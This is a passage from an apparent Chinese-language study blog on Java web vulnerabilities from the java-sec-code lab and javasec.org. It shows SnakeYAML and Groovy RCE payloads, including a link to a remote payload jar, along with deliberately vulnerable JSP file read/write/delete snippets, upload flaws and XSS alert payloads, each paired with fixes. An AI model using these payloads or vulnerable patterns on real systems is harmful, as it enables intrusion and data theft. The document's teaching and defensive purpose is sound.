href=\"http://118.178.180.212/yaml-payload.jar&quot;]]]]\">http://118.178.180.212/yaml-payload.jar&quot;]]]]</a>)</p>\n<p>即可弹出记事本，据说基本碰不到</p>\n<h2 id=\"groovy：\"><a href=\"#groovy：\" class=\"headerlink\" title=\"groovy：\"></a>groovy：</h2><p>groovy是类似python的语言，能够很好的结合Java虚拟机。</p>\n<p>在Java代码中直接创建一个GroovyShell对象，使用evaluate方法执行代码</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">@GetMapping(&quot;groovy&quot;)\n    public void groovyshell(String content) &#123;\n        GroovyShell groovyShell &#x3D; new GroovyShell();\n        groovyShell.evaluate(content);\n    &#125;</code></pre>\n\n<p>直接访问：<a href=\"http://localhost:8080/rce/groovy?content=%22calc%22.execute()\">http://localhost:8080/rce/groovy?content=%22calc%22.execute()</a></p>\n<p>就可以弹出计算器，与Runtime的区别就是它有自己的语法格式，需要学习一下</p>\n<p>学习链接：<a href=\"https://www.w3cschool.cn/groovy/groovy_basic_syntax.html\">https://www.w3cschool.cn/groovy/groovy_basic_syntax.html</a></p>\n<h2 id=\"修复：\"><a href=\"#修复：\" class=\"headerlink\" title=\"修复：\"></a>修复：</h2><p>命令执行的修复，这个作者提出的是通过正则，和前面sql注入一样的修复。这怎么能行呢？该执行的还是执行。</p>\n<p>像这种命令执行的，还是用白名单好一点，限制执行的命令。同时使用过滤，防止命令拼接。</p>\n<p>其中snakeyaml的修复很简单，就是使用SafeConstructor类，限制而已类的加载</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">@GetMapping(&quot;&#x2F;sec&#x2F;yarm&quot;)\npublic void secYarm(String content) &#123;\n    Yaml y &#x3D; new Yaml(new SafeConstructor());\n    y.load(content);\n&#125;</code></pre>\n\n<p>用payload访问修复的，直接报错。</p>\n<h1 id=\"文件访问类漏洞：\"><a href=\"#文件访问类漏洞：\" class=\"headerlink\" title=\"文件访问类漏洞：\"></a>文件访问类漏洞：</h1><h2 id=\"任意文件读取\"><a href=\"#任意文件读取\" class=\"headerlink\" title=\"任意文件读取\"></a>任意文件读取</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">@GetMapping(&quot;&#x2F;path_traversal&#x2F;vul&quot;)\n    public String getImage(String filepath) throws IOException &#123;\n        return getImgBase64(filepath);\n    &#125;</code></pre>\n\n<p>getImgBase64方法</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">private String getImgBase64(String imgFile) throws IOException &#123;\n\n        logger.info(&quot;Working directory: &quot; + System.getProperty(&quot;user.dir&quot;));\n        logger.info(&quot;File path: &quot; + imgFile);\n\n        File f &#x3D; new File(imgFile);\n        if (f.exists() &amp;&amp; !f.isDirectory()) &#123;\n            byte[] data &#x3D; Files.readAllBytes(Paths.get(imgFile));\n            return new String(Base64.encodeBase64(data));\n        &#125; else &#123;\n            return &quot;File doesn&#39;t exist or is not a file.&quot;;\n        &#125;\n    &#125;</code></pre>\n\n<p>如果文件目录存在，就读取文件内容并且将其base64编码显示</p>\n<p>访问：<a href=\"http://localhost:8080/path_traversal/vul?filepath=ceshi.txt\">http://localhost:8080/path_traversal/vul?filepath=ceshi.txt</a></p>\n<p>直接获取项目目录ceshi.txt内容，解码就能看到具体内容</p>\n<h3 id=\"修复：-1\"><a href=\"#修复：-1\" class=\"headerlink\" title=\"修复：\"></a>修复：</h3><p>视频作者的修复就是直接添加一个方法，看路径中是否存在.. 和 / ，存在就返回null</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">public static String pathFilter(String filepath) &#123;\n       String temp &#x3D; filepath;\n\n       &#x2F;&#x2F; use while to sovle multi urlencode\n       while (temp.indexOf(&#39;%&#39;) !&#x3D; -1) &#123;\n           try &#123;\n               temp &#x3D; URLDecoder.decode(temp, &quot;utf-8&quot;);\n           &#125; catch (UnsupportedEncodingException e) &#123;\n               logger.info(&quot;Unsupported encoding exception: &quot; + filepath);\n               return null;\n           &#125; catch (Exception e) &#123;\n               logger.info(e.toString());\n               return null;\n           &#125;\n       &#125;\n\n       if (temp.contains(&quot;..&quot;) || temp.charAt(0) &#x3D;&#x3D; &#39;&#x2F;&#39;) &#123;\n           return null;\n       &#125;\n\n       return filepath;\n   &#125;</code></pre>\n\n<p>虽然不能任意读取，但是同级目录还是能读取的</p>\n<p>关于这个漏洞，还是看javasec.org的，讲的比较深</p>\n<p><a href=\"https://javasec.org/java-vuls/FileSystem.html#%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE%E7%B1%BB%E6%BC%8F%E6%B4%9E\">https://javasec.org/java-vuls/FileSystem.html#%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE%E7%B1%BB%E6%BC%8F%E6%B4%9E</a></p>\n<p>Javasec.org中将文件读取漏洞分为同级目录任意文件读取和跨目录任意文件读取，看，这个视频作者的修复不完全导致还是存在文件读取漏洞。</p>\n<p>再加个白名单判断应该能处理好这个漏洞。</p>\n<h2 id=\"NIO任意文件读取：\"><a href=\"#NIO任意文件读取：\" class=\"headerlink\" title=\"NIO任意文件读取：\"></a>NIO任意文件读取：</h2><p><a href=\"https://javasec.org/java-vuls/FileSystem.html#7-io%E5%92%8Cnio2%E7%9A%84%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%94%AF%E6%8C%81\">https://javasec.org/java-vuls/FileSystem.html#7-io%E5%92%8Cnio2%E7%9A%84%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%94%AF%E6%8C%81</a></p>\n<p>都是文件读取类，就放在一起了。当然，sec单独列出可能代表着NIO不仅仅能读取文件，也能进行其他文件类操作。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.io.IOException&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.nio.file.Files&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.nio.file.Paths&quot; %&gt;\n&lt;pre&gt;\n&lt;%\n    try &#123;\n        byte[] bytes &#x3D; Files.readAllBytes(Paths.get(request.getParameter(&quot;file&quot;)));\n        out.println(new String(bytes));\n    &#125; catch (IOException e) &#123;\n        e.printStackTrace();\n    &#125;\n%&gt;\n&lt;&#x2F;pre&gt;</code></pre>\n\n<h2 id=\"文件写入：\"><a href=\"#文件写入：\" class=\"headerlink\" title=\"文件写入：\"></a>文件写入：</h2><p><a href=\"https://javasec.org/java-vuls/FileSystem.html#2-%E5%86%99%E6%96%87%E4%BB%B6\">https://javasec.org/java-vuls/FileSystem.html#2-%E5%86%99%E6%96%87%E4%BB%B6</a></p>\n<p>sec的漏洞代码，是用jsp写的</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.io.File&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.io.FileOutputStream&quot; %&gt;\n\n&lt;%\n    File file &#x3D; new File(request.getParameter(&quot;f&quot;));\n    FileOutputStream fos &#x3D; new FileOutputStream(file);\n    fos.write(request.getParameter(&quot;c&quot;).getBytes());\n    fos.flush();\n    fos.close();\n\n    out.println(file.getAbsoluteFile() + &quot;\\t&quot; + file.exists());\n%&gt;</code></pre>\n\n<p>f是文件路径，c是文件内容。没有任何过滤限制导致任意文件写入</p>\n<p>可以跨目录写入，也可以通过绝对路径写入</p>\n<h2 id=\"任意文件删除：\"><a href=\"#任意文件删除：\" class=\"headerlink\" title=\"任意文件删除：\"></a>任意文件删除：</h2><p><a href=\"https://javasec.org/java-vuls/FileSystem.html#3-%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6\">https://javasec.org/java-vuls/FileSystem.html#3-%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6</a></p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.io.File&quot; %&gt;\n&lt;%\n    File file &#x3D; new File(request.getParameter(&quot;file&quot;));\n    out.println(file.delete());\n%&gt;</code></pre>\n\n<p>利用反射删除文件</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.io.File&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.lang.reflect.Method&quot; %&gt;\n\n&lt;%\n    String file &#x3D; request.getParameter(&quot;file&quot;);\n\n    Method m &#x3D; Class.forName(&quot;java.io.DefaultFileSystem&quot;).getMethod(&quot;getFileSystem&quot;);\n    m.setAccessible(true);\n    Object fs &#x3D; m.invoke(null);\n\n    Method m2 &#x3D; fs.getClass().getMethod(&quot;delete&quot;, File.class);\n    m2.setAccessible(true);\n    out.print(m2.invoke(fs, new File(file)));\n%&gt;</code></pre>\n\n<h2 id=\"任意文件复制-移动：\"><a href=\"#任意文件复制-移动：\" class=\"headerlink\" title=\"任意文件复制/移动：\"></a>任意文件复制/移动：</h2><p><a href=\"https://javasec.org/java-vuls/FileSystem.html#4-%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E5%A4%8D%E5%88%B6%E3%80%81%E7%A7%BB%E5%8A%A8\">https://javasec.org/java-vuls/FileSystem.html#4-%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E5%A4%8D%E5%88%B6%E3%80%81%E7%A7%BB%E5%8A%A8</a></p>\n<p>结合上传等进行利用</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.io.IOException&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.nio.file.Files&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.nio.file.Path&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.nio.file.Paths&quot; %&gt;\n&lt;pre&gt;\n&lt;%\n    try &#123;\n        Path path &#x3D; Files.copy(Paths.get(request.getParameter(&quot;source&quot;)), Paths.get(request.getParameter(&quot;dest&quot;)));\n\n        out.println(path);\n    &#125; catch (IOException e) &#123;\n        e.printStackTrace();\n    &#125;\n%&gt;\n&lt;&#x2F;pre&gt;</code></pre>\n\n<h2 id=\"重命名文件：\"><a href=\"#重命名文件：\" class=\"headerlink\" title=\"重命名文件：\"></a>重命名文件：</h2><p><a href=\"https://javasec.org/java-vuls/FileSystem.html#5-%E9%87%8D%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6\">https://javasec.org/java-vuls/FileSystem.html#5-%E9%87%8D%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6</a></p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.io.File&quot; %&gt;\n&lt;%\n    String fileName1 &#x3D; request.getParameter(&quot;s&quot;);\n    String fileName2 &#x3D; request.getParameter(&quot;d&quot;);\n\n    File f &#x3D; new File(fileName1);\n    File d &#x3D; new File(fileName2);\n\n    f.renameTo(d);\n\n    out.println(d + &quot;\\t&quot; + d.exists());\n%&gt;</code></pre>\n\n<p>还是结合上传</p>\n<h2 id=\"文件目录遍历：\"><a href=\"#文件目录遍历：\" class=\"headerlink\" title=\"文件目录遍历：\"></a>文件目录遍历：</h2><p><a href=\"https://javasec.org/java-vuls/FileSystem.html#6-%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86\">https://javasec.org/java-vuls/FileSystem.html#6-%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86</a></p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.io.File&quot; %&gt;\n\n&lt;pre&gt;\n&lt;%\n    String[] files &#x3D; new File(request.getParameter(&quot;dir&quot;)).list();\n\n    for (String file : files) &#123;\n        out.println(file);\n    &#125;\n%&gt;\n&lt;&#x2F;pre&gt;</code></pre>\n\n<p>这个代码只能列出路径目录，有时候不仅能列出还能够访问或下载</p>\n<h2 id=\"修复：-2\"><a href=\"#修复：-2\" class=\"headerlink\" title=\"修复：\"></a>修复：</h2><p>关于文件访问类的修复，就和前面的任意文件读取修复差不多。限制访问路径，设置黑白名单，做好过滤。</p>\n<p>Javasec关于目录遍历的修复例子：</p>\n<p><a href=\"https://javasec.org/java-vuls/FileSystem.html#8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D\">https://javasec.org/java-vuls/FileSystem.html#8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D</a></p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&lt;%@ page import&#x3D;&quot;java.io.File&quot; %&gt;&lt;%--\n  Created by IntelliJ IDEA.\n  User: yz\n  Date: 2019&#x2F;12&#x2F;4\n  Time: 6:08 下午\n  To change this template use File | Settings | File Templates.\n--%&gt;\n&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;\n&lt;%!\n    &#x2F;&#x2F; 定义限制用户遍历的文件目录常量\n    private static final String IMAGE_DIR &#x3D; &quot;&#x2F;data&#x2F;images&#x2F;&quot;;\n%&gt;\n&lt;%\n    &#x2F;&#x2F; 定义需要遍历的目录\n    String dirStr &#x3D; request.getParameter(&quot;dir&quot;);\n\n    if (dirStr !&#x3D; null) &#123;\n        File dir &#x3D; new File(dirStr);\n\n        &#x2F;&#x2F; 获取文件绝对路径，转换成标准的文件路径\n        String fileDir &#x3D; (dir.getAbsoluteFile().getCanonicalFile() + &quot;&#x2F;&quot;).replace(&quot;\\\\\\\\&quot;, &quot;&#x2F;&quot;).replaceAll(&quot;&#x2F;+&quot;, &quot;&#x2F;&quot;);\n        out.println(&quot;&lt;h3&gt;&quot; + fileDir + &quot;&lt;&#x2F;h3&gt;&quot;);\n\n        &#x2F;&#x2F; 检查当前用户传入的目录是否包含在系统限定的目录下\n        if (fileDir.startsWith(IMAGE_DIR)) &#123;\n            File[] dirs &#x3D; dir.listFiles();\n\n            out.println(&quot;&lt;pre&gt;&quot;);\n\n            for (File file : dirs) &#123;\n                out.println(file.getName());\n            &#125;\n\n            out.println(&quot;&lt;&#x2F;pre&gt;&quot;);\n        &#125; else &#123;\n            out.println(&quot;目录不合法!&quot;);\n        &#125;\n    &#125;\n\n%&gt;</code></pre>\n\n<p>这就是典型的白名单</p>\n<p>同时还需要注意常见的漏洞利用手法，关于%00截断的修复</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&#x2F;**\n * 检查文件名中是否包含了空字节，禁止出现%00字符截断\n *\n * @param file 访问文件\n * @return 是否包含空字节\n *&#x2F;\nprivate static boolean nullByteValid(File file) &#123;\n   return file.getName().indexOf(&#39;\\u0000&#39;) &lt; 1;\n&#125;</code></pre>\n\n<h1 id=\"文件上传漏洞：\"><a href=\"#文件上传漏洞：\" class=\"headerlink\" title=\"文件上传漏洞：\"></a>文件上传漏洞：</h1><h2 id=\"任意文件上传：\"><a href=\"#任意文件上传：\" class=\"headerlink\" title=\"任意文件上传：\"></a>任意文件上传：</h2><p>漏洞代码：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">@GetMapping(&quot;&#x2F;any&quot;)\n    public String index() &#123;\n        return &quot;upload&quot;; &#x2F;&#x2F; return upload.html page\n    &#125;</code></pre>\n\n<p>上传表单：</p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\">&lt;!DOCTYPE html&gt;\n&lt;html xmlns:th&#x3D;&quot;http:&#x2F;&#x2F;www.thymeleaf.org&quot;&gt;\n&lt;body&gt;\n\n&lt;h3&gt;file upload&lt;&#x2F;h3&gt;\n\n&lt;form method&#x3D;&quot;POST&quot; th:action&#x3D;&quot;upload&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;\n    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;\n    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot; &#x2F;&gt;\n&lt;&#x2F;form&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n</code></pre>\n\n<p>upload方法：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">@PostMapping(&quot;&#x2F;upload&quot;)\n   public String singleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file,\n                                  RedirectAttributes redirectAttributes) &#123;\n       if (file.isEmpty()) &#123;\n           &#x2F;&#x2F; 赋值给uploadStatus.html里的动态参数message\n           redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;Please select a file to upload&quot;);\n           return &quot;redirect:&#x2F;file&#x2F;status&quot;;\n       &#125;\n\n       try &#123;\n           &#x2F;&#x2F; Get the file and save it somewhere\n           byte[] bytes &#x3D; file.getBytes();\n           Path path &#x3D; Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());\n           Files.write(path, bytes);\n\n           redirectAttributes.addFlashAttribute(&quot;message&quot;,\n                   &quot;You successfully uploaded &#39;&quot; + UPLOADED_FOLDER + file.getOriginalFilename() + &quot;&#39;&quot;);\n\n       &#125; catch (IOException e) &#123;\n           redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;upload failed&quot;);\n           logger.error(e.toString());\n       &#125;\n\n       return &quot;redirect:&#x2F;file&#x2F;status&quot;;\n   &#125;</code></pre>\n\n<p>后面调用的方法就不列出来了，就是显示上传成功的信息。</p>\n<p>这就是个典型的任意文件上传漏洞</p>\n<p>Javasec文件上传描述：<a href=\"https://javasec.org/java-vuls/FileUpload.html#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E\">https://javasec.org/java-vuls/FileUpload.html#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E</a></p>\n<p>感觉有点搞开发的意思了，也是。就是弄RASP的。</p>\n<h2 id=\"修复：-3\"><a href=\"#修复：-3\" class=\"headerlink\" title=\"修复：\"></a>修复：</h2><p>白名单，黑名单，文件头，MIME，防止截断，路径写死，严格控制执行权限等。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">   @PostMapping(&quot;&#x2F;upload&#x2F;picture&quot;)\n    @ResponseBody\n    public String uploadPicture(@RequestParam(&quot;file&quot;) MultipartFile multifile) throws Exception &#123;\n        &#x2F;&#x2F;MultipartFile是spring类型，\n        if (multifile.isEmpty()) &#123;\n            return &quot;Please select a file to upload&quot;;\n        &#125;\n\n        String fileName &#x3D; multifile.getOriginalFilename();&#x2F;&#x2F;得到上传的文件名，\n        String Suffix &#x3D; fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); &#x2F;&#x2F; 获取文件后缀名\n        String mimeType &#x3D; multifile.getContentType(); &#x2F;&#x2F; 获取MIME类型\n        &#x2F;&#x2F;String filePath &#x3D; falpath(multifile); &#x2F;&#x2F;D:&#x2F;tmp&#x2F;pic&#x2F;xxxx\n\n\n\n        &#x2F;&#x2F; 判断文件后缀名是否在白名单内  校验1\n        String[] picSuffixList &#x3D; &#123;&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;&#125;;\n        boolean suffixFlag &#x3D; false;\n        for (String white_suffix : picSuffixList) &#123;\n            if (Suffix.toLowerCase().equals(white_suffix)) &#123;\n                suffixFlag &#x3D; true;\n                break;\n            &#125;\n        &#125;\n        if (!suffixFlag) &#123;\n            logger.error(&quot;[-] Suffix error: &quot; + Suffix);\n            &#x2F;&#x2F;deleteFile(filePath);\n            return &quot;Upload failed. Illeagl picture.&quot;;\n        &#125;\n\n\n        &#x2F;&#x2F; 判断MIME类型是否在黑名单内 校验2\n        String[] mimeTypeBlackList &#x3D; &#123;\n                &quot;text&#x2F;html&quot;,\n                &quot;text&#x2F;javascript&quot;,\n                &quot;application&#x2F;javascript&quot;,\n                &quot;application&#x2F;ecmascript&quot;,\n                &quot;text&#x2F;xml&quot;,\n                &quot;application&#x2F;xml&quot;\n        &#125;;\n        for (String blackMimeType : mimeTypeBlackList) &#123;\n            &#x2F;&#x2F; 用contains是为了防止text&#x2F;html;charset&#x3D;UTF-8绕过\n            if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) &#123;\n                logger.error(&quot;[-] Mime type error: &quot; + mimeType);\n                &#x2F;&#x2F;deleteFile(filePath);\n                return &quot;Upload failed. Illeagl picture.&quot;;\n            &#125;\n        &#125;\n\n        File excelFile &#x3D; convert(multifile);&#x2F;&#x2F;文件名字做了uuid处理\n        String filePath &#x3D; excelFile.getPath();\n        &#x2F;&#x2F; 判断文件内容是否是图片 校验3\n        boolean isImageFlag &#x3D; isImage(excelFile);\n        if (!isImageFlag) &#123;\n            logger.error(&quot;[-] File is not Image&quot;);\n            deleteFile(filePath);\n            return &quot;Upload failed. Illeagl picture.&quot;;\n        &#125;\n\n\n&#x2F;*\n        try &#123;\n            &#x2F;&#x2F; Get the file and save it somewhere\n            byte[] bytes &#x3D; multifile.getBytes();\n            &#x2F;&#x2F;Path path &#x3D; Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());\n            &#x2F;&#x2F;Path path &#x3D; Paths.get(UPLOADED_FOLDER + falpath(multifile));\n            Path path &#x3D; excelFile.toPath();&#x2F;&#x2F;..&#x2F;目录穿越的过滤掉了，进行了从命名的操作\n            Files.write(path, bytes);\n        &#125; catch (IOException e) &#123;\n            logger.error(e.toString());\n            deleteFile(filePath);\n            return &quot;Upload failed&quot;;\n        &#125;\n*&#x2F;\n\n        logger.info(&quot;[+] Safe file. Suffix: &#123;&#125;, MIME: &#123;&#125;&quot;, Suffix, mimeType);\n        logger.info(&quot;[+] Successfully uploaded &#123;&#125;&quot;, filePath);\n        return String.format(&quot;You successfully uploaded &#39;%s&#39;&quot;, filePath);\n    &#125;</code></pre>\n\n<p>验证文件内容，使用uuid生成随机文件名</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">\nprivate String falpath (MultipartFile multiFile)throws Exception &#123;\n    String fileName &#x3D; multiFile.getOriginalFilename();\n    String suffix &#x3D; fileName.substring(fileName.lastIndexOf(&quot;.&quot;));\n    UUID uuid &#x3D; Generators.timeBasedGenerator().generate();\n    randomFilePath &#x3D; UPLOADED_FOLDER + uuid + suffix;\n    return  randomFilePath;\n\n\n&#125;\n\n\n&#x2F;**\n * 为了使用ImageIO.read()\n *\n * 不建议使用transferTo，因为原始的MultipartFile会被覆盖\n * https:&#x2F;&#x2F;stackoverflow.com&#x2F;questions&#x2F;24339990&#x2F;how-to-convert-a-multipart-file-to-file\n *&#x2F;\nprivate File convert(MultipartFile multiFile) throws Exception &#123;\n    String fileName &#x3D; multiFile.getOriginalFilename();\n    String suffix &#x3D; fileName.substring(fileName.lastIndexOf(&quot;.&quot;));\n    UUID uuid &#x3D; Generators.timeBasedGenerator().generate();\n    randomFilePath &#x3D; UPLOADED_FOLDER + uuid + suffix;\n    &#x2F;&#x2F; 随机生成一个同后缀名的文件\n    File convFile &#x3D; new File(randomFilePath);\n    boolean ret &#x3D; convFile.createNewFile();\n    if (!ret) &#123;\n        return null;\n    &#125;\n    FileOutputStream fos &#x3D; new FileOutputStream(convFile);\n    fos.write(multiFile.getBytes());\n    fos.close();\n    return convFile;\n&#125;\n\n&#x2F;**\n * Check if the file is a picture.\n *&#x2F;\nprivate static boolean isImage(File file) throws IOException &#123;\n    BufferedImage bi &#x3D; ImageIO.read(file);\n    return bi !&#x3D; null;\n&#125;</code></pre>\n\n<h1 id=\"xss：\"><a href=\"#xss：\" class=\"headerlink\" title=\"xss：\"></a>xss：</h1><h2 id=\"反射性：\"><a href=\"#反射性：\" class=\"headerlink\" title=\"反射性：\"></a>反射性：</h2><p>漏洞代码：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">@RequestMapping(&quot;&#x2F;reflect&quot;)\n    @ResponseBody\n    public static String reflect(String xss) &#123;\n        return xss;\n    &#125;</code></pre>\n\n<p>直接输出到页面，访问：<a href=\"http://localhost:8080/xss/reflect?xss=alert(1)\">http://localhost:8080/xss/reflect?xss=%3Cscript%3Ealert(1)%3C/script%3E</a></p>\n<p>即可弹窗</p>\n<p>Javasec：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&lt;%&#x3D;request.getParameter(&quot;input&quot;)%&gt;</code></pre>\n\n<h2 id=\"存储型：\"><a href=\"#存储型：\" class=\"headerlink\" title=\"存储型：\"></a>存储型：</h2><p>漏洞代码：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">@RequestMapping(&quot;&#x2F;stored&#x2F;store&quot;)\n    @ResponseBody\n    public String store(String xss, HttpServletResponse response) &#123;\n        &#x2F;&#x2F;String en_xss &#x3D; encode(xss);\n        Cookie cookie &#x3D; new Cookie(&quot;xss&quot;, en_xss);\n        response.addCookie(cookie);\n        return &quot;Set param into cookie&quot;;\n    &#125;</code></pre>\n\n<p>这里通过添加到cookie来存储xss代码，是为了方便演示，实际情况一般是添加到数据库里面。</p>\n<p>访问：<a href=\"http://localhost:8080/xss/stored/store?xss=alert(1)\">http://localhost:8080/xss/stored/store?xss=%3Cscript%3Ealert(1)%3C/script%3E</a></p>\n<p>设置xss cookie值，接着访问show方法：<a href=\"http://localhost:8080/xss/stored/show\">http://localhost:8080/xss/stored/show</a></p>\n<p>即可弹窗</p>\n<p>Javasec：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.text.SimpleDateFormat&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.util.*&quot; %&gt;\n&lt;%\n    String username &#x3D; request.getParameter(&quot;username&quot;);\n    String content &#x3D; request.getParameter(&quot;content&quot;);\n\n    String guestBookKey &#x3D; &quot;GUEST_BOOK&quot;;\n    List&lt;Map&lt;String, String&gt;&gt; comments &#x3D; new ArrayList&lt;Map&lt;String, String&gt;&gt;();\n\n    if (content !&#x3D; null) &#123;\n        Object obj &#x3D; application.getAttribute(guestBookKey);\n\n        if (obj !&#x3D; null) &#123;\n            comments &#x3D; (List&lt;Map&lt;String, String&gt;&gt;) obj;\n        &#125;\n\n        Map&lt;String, String&gt; comment &#x3D; new HashMap&lt;String, String&gt;();\n        String              ip      &#x3D; request.getHeader(&quot;x-real-ip&quot;);\n\n        if (ip &#x3D;&#x3D; null) &#123;\n            ip &#x3D; request.getRemoteAddr();\n        &#125;\n\n        comment.put(&quot;username&quot;, username);\n        comment.put(&quot;content&quot;, content);\n        comment.put(&quot;ip&quot;, ip);\n        comment.put(&quot;date&quot;, new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;).format(new Date()));\n\n        comments.add(comment);\n\n        application.setAttribute(guestBookKey, comments);\n    &#125;\n%&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;留言板&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;style&gt;\n    * &#123;\n        margin: 0;\n        padding: 0;\n    &#125;\n&lt;&#x2F;style&gt;\n&lt;body&gt;\n&lt;div style&#x3D;&quot;border: 1px solid #C6C6C6;&quot;&gt;\n    &lt;div style&#x3D;&quot;text-align: center;&quot;&gt;\n        &lt;h2&gt;在线留言板&lt;&#x2F;h2&gt;\n    &lt;&#x2F;div&gt;\n    &lt;div&gt;\n        &lt;dl&gt;\n            &lt;%\n                Object obj &#x3D; application.getAttribute(guestBookKey);\n\n                if (obj instanceof List) &#123;\n                    comments &#x3D; (List&lt;Map&lt;String, String&gt;&gt;) obj;\n\n                    for (Map&lt;String, String&gt; comment : comments) &#123;\n            %&gt;\n            &lt;dd&gt;\n                &lt;div style&#x3D;&quot;min-height: 50px; margin: 20px; border-bottom: 1px solid #9F9F9F;&quot;&gt;\n                    &lt;p&gt;&lt;B&gt;&lt;%&#x3D;comment.get(&quot;username&quot;)%&gt;\n                    &lt;&#x2F;B&gt;[&lt;%&#x3D;comment.get(&quot;ip&quot;)%&gt;] 于 